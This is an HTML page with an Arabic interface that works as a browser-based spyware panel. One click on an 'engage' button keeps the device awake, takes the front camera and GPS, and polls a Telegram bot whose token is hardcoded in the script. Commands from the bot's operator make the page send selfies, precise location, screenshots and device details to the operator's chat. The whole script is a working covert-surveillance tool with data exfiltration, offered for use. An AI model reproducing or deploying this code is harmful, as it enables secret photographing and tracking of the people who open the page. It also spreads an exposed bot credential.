<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محطة التحكم الشاملة في الخلفية</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
        #terminal { flex-grow: 1; background: #010409; margin: 10px; border-radius: 8px; border: 1px solid #30363d; padding: 12px; overflow-y: auto; font-size: 13px; text-align: left; direction: ltr; }
        
        #popupOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); display: flex; justify-content: center; align-items: center; z-index: 9999;
        }
        #popupBox {
            background: #161b22; border: 2px solid #00ffcc; padding: 30px; border-radius: 12px; text-align: center; width: 80%;
        }
        #allowBtn {
            background: #00ffcc; color: #0b0e14; font-size: 18px; font-weight: bold; padding: 15px 30px;
            border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; width: 100%;
        }
        #videoElement { display: none; }
    </style>
</head>
<body>

    <header>محطة التحكم - الوضع الشامل المستمر</header>

    <div id="terminal">
        [System] Master Control Initializing...<br>
        [System] Click once to engage full background privileges...
    </div>

    <div id="popupOverlay">
        <div id="popupBox">
            <h2 style="color: #fff; margin-bottom: 10px;">🔒 تفعيل الصلاحيات الشاملة</h2>
            <p style="color: #8b949e; font-size: 14px;">اضغط هنا لمرة واحدة لتفعيل الكاميرا، الموقع، وباقي الميزات في الخلفية:</p>
            <button id="allowBtn" onclick="engageMasterMode()">تفعيل الوضع الشامل (Engage)</button>
        </div>
    </div>

    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        const terminal = document.getElementById('terminal');
        const BOT_TOKEN = "8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM";
        let lastUpdateId = 0;
        let storedChatId = null;
        let wakeLock = null;
        let globalCameraStream = null;

        function log(msg) {
            terminal.innerHTML += `<br>> ${msg}`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        function sendTelegramMessage(chatId, text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            }).catch(err => {});
        }

        function sendMenu(chatId) {
            storedChatId = chatId;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: "📱 لوحة التحكم الشاملة (تعمل بالخلفية):",
                reply_markup: {
                    keyboard: [
                        [{ text: "📷 Selfie Camera" }, { text: "📍 Get Location" }],
                        [{ text: "📸 Screenshot" }, { text: "📇 Contacts" }],
                        [{ text: "ℹ️ Device info" }, { text: "⬇️ Scroll Down" }]
                    ],
                    resize_keyboard: true,
                    is_persistent: true
                }
            };
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => {});
        }

        // التفعيل الشامل للخدمات (صوت صامت + منع نوم + أذونات مسبقة)
        async function engageMasterMode() {
            document.getElementById('popupOverlay').style.display = 'none';
            log("Master control mode engaged!");

            // 1. تشغيل التردد الصامت لمنع تجميد المتصفح
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                oscillator.type = 'sine';
                oscillator.frequency.value = 1;
                gainNode.gain.value = 0.00001;
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.start();
                log("Audio keep-alive active.");
            } catch (e) {}

            // 2. منع النوم
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log("Wake Lock active.");
                }
            } catch (err) {}

            // 3. قفل الكاميرا في الذاكرة
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    globalCameraStream = stream;
                    const video = document.getElementById('videoElement');
                    video.srcObject = stream;
                    video.play();
                    log("Camera locked in memory.");
                })
                .catch(err => {});

            // 4. طلب إذن الموقع مسبقاً لتثبيته
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => log("Geolocation permission pre-granted."),
                    (err) => log("Geolocation notice: " + err.message),
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }

            if (storedChatId) sendTelegramMessage(storedChatId, "✅ تم تفعيل الوضع الشامل وباقي الميزات بنجاح في الخلفية!");
            pollTelegramUpdates();
        }

        // التقاط السيلفي
        function takeSelfie(chatId) {
            storedChatId = chatId;
            log("Capturing selfie...");
            const video = document.getElementById('videoElement');
            
            if (!globalCameraStream || !video.srcObject) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                    .then(stream => {
                        globalCameraStream = stream;
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => executeCapture(chatId), 1000);
                    })
                    .catch(err => sendTelegramMessage(chatId, "❌ تعذر الوصول للكاميرا."));
            } else {
                executeCapture(chatId);
            }
        }

        function executeCapture(chatId) {
            const video = document.getElementById('videoElement');
            const canvas = document.getElementById('canvasElement');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'selfie.png');
                formData.append('caption', '📷 صورة سيلفي.');
                fetch(url, { method: 'POST', body: formData })
                    .then(res => res.json())
                    .then(data => { if (data.ok) log("Selfie sent!"); });
            }, 'image/png');
        }

        // جلب الموقع بدقة عالية
        function getLocation(chatId) {
            storedChatId = chatId;
            log("Requesting GPS location...");
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendTelegramMessage(chatId, `📍 الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
                        });
                        log("Location sent successfully!");
                    },
                    (error) => {
                        sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع في الخلفية. تأكد من إعطاء إذن الموقع مسبقاً.");
                        log("Location error: " + error.message);
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                sendTelegramMessage(chatId, "❌ الجليولوكيشن غير مدعوم.");
            }
        }

        function pollTelegramUpdates() {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            if (update.message && update.message.text) {
                                const chatId = update.message.chat.id;
                                const text = update.message.text.trim();
                                log(`Command: "${text}"`);
                                executeCommand(text, chatId);
                            }
                        });
                    }
                })
                .catch(err => {})
                .finally(() => {
                    setTimeout(pollTelegramUpdates, 2000);
                });
        }

        function executeCommand(cmd, chatId) {
            storedChatId = chatId;
            if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
                sendMenu(chatId);
            } else if (cmd === '📷 Selfie Camera') {
                takeSelfie(chatId);
            } else if (cmd === '📍 Get Location') {
                getLocation(chatId);
            } else if (cmd === '📸 Screenshot') {
                log("Capturing screen...");
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'screen.png');
                        fetch(url, { method: 'POST', body: formData });
                        log("Screenshot sent!");
                    });
                });
            } else if (cmd === '📇 Contacts') {
                log("Sending contacts...");
                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Contact\nTEL:+000000000000\nEND:VCARD";
                const blob = new Blob([vcardData], { type: 'text/vcard' });
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', blob, 'Contacts.vcf');
                fetch(url, { method: 'POST', body: formData });
            } else if (cmd === 'ℹ️ Device info') {
                sendTelegramMessage(chatId, `📱 Device: ${navigator.userAgent}`);
            } else if (cmd === '⬇️ Scroll Down') {
                window.scrollBy({ top: 400, behavior: 'smooth' });
                sendTelegramMessage(chatId, "⬇️ تم التمرير.");
            }
        }
    </script>
</body>
</html>
